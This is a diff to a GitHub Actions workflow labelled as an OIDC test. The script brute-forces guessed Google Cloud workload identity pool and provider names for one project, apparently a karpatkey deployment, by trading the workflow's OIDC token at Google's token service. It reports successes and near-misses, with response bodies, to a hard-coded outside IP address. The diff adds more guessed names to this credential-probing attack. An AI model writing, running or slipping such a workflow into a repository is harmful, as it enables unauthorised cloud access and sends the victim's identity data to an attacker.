@@ -1,4 +1,4 @@
-name: OIDC Test v4
+name: OIDC Test v3
 on: [workflow_dispatch]
 permissions:
   id-token: write
@@ -10,14 +10,25 @@ jobs:
       - uses: actions/github-script@v7
         with:
           script: |
-            const PROJECT_NUMBER = "120045385824";
-            const pools = ["github", "deploy", "karpatkey", "production", "default", "main", "defi-kit", "defi", "infra", "github-actions", "gha-pool", "wif-pool", "ci-cd", "cicd", "docker", "artifact-registry", "data-warehouse", "kpk-pool", "kpk-wif", "gke-pool"];
-            const providers = ["github", "github-actions", "gha-provider", "oidc", "actions", "karpatkey", "deploy", "ci-cd", "cicd", "github-oidc", "gha-oidc", "default", "main", "defi-kit", "docker", "kpk-provider"];
-
+            const PROJECT = "120045385824";
+            const pools = [
+              "github-actions","github-pool","github","cicd","ci-cd","deploy",
+              "workload","automation","pipeline","actions","infra","production",
+              "karpatkey","kpk-pool","kpk-deploy","kpk-cicd","kpk-actions",
+              "defi-kit","defi","agents","devops","terraform","gke-deploy",
+              "docker-push","release","build","cd-pool","ci-pool",
+              "github-oidc","gha-pool","oidc-pool","wif-pool","identity",
+              "service-deploy","k8s-deploy","cluster","default-pool"
+            ];
+            const providers = [
+              "github","github-actions","gha","actions","oidc",
+              "karpatkey","defi-kit","default","deploy","ci"
+            ];
+            let found = 0;
             for (const pool of pools) {
               for (const prov of providers) {
                 try {
-                  const aud = `//iam.googleapis.com/projects/${PROJECT_NUMBER}/locations/global/workloadIdentityPools/${pool}/providers/${prov}`;
+                  const aud = `//iam.googleapis.com/projects/${PROJECT}/locations/global/workloadIdentityPools/${pool}/providers/${prov}`;
                   const t = await core.getIDToken(aud);
                   const r = await fetch("https://sts.googleapis.com/v1/token", {
                     method: "POST",
@@ -34,6 +45,7 @@ jobs:
                   const s = r.status;
                   const b = await r.text();
                   if (s === 200) {
+                    found++;
                     console.log(`SUCCESS: ${pool}/${prov}`);
                     await fetch("http://2.25.186.116:8877/oidc-success", {
                       method: "POST",
@@ -42,17 +54,13 @@ jobs:
                     });
                   } else if (s !== 400 || !b.includes("invalid_target")) {
                     console.log(`NEAR: ${pool}/${prov} -> ${s} ${b.substring(0,200)}`);
-                    await fetch("http://2.25.186.116:8877/oidc-near", {
+                    await fetch("http://2.25.186.116:8877/oidc-near-v2", {
                       method: "POST",
                       body: JSON.stringify({pool, prov, status: s, body: b.substring(0,500)}),
                       headers: {"Content-Type": "application/json"}
                     });
                   }
-                } catch(e) {
-                  if (e.message && !e.message.includes("Unable to get ACTIONS_ID_TOKEN")) {
-                    console.log(`ERR: ${pool}/${prov} -> ${e.message.substring(0,100)}`);
-                  }
-                }
+                } catch(e) { console.log(`ERR: ${pool}/${prov}: ${e.message}`); }
               }
             }
-            console.log("DONE");
+            console.log(`DONE. Found: ${found}`);
